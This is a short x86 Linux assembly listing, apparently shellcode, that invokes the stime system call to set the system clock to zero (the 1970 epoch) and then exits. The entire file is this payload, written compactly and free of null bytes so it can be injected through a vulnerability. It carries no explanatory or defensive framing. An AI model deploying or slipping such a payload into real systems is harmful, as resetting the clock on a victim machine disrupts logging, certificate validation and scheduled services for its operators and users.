global _start

section .text
_start:

; stime([0])
      push byte 25
      pop eax
      cdq
      push edx
      mov ebx, esp
      int 0x80

 ; exit()
      inc eax
      int 0x80
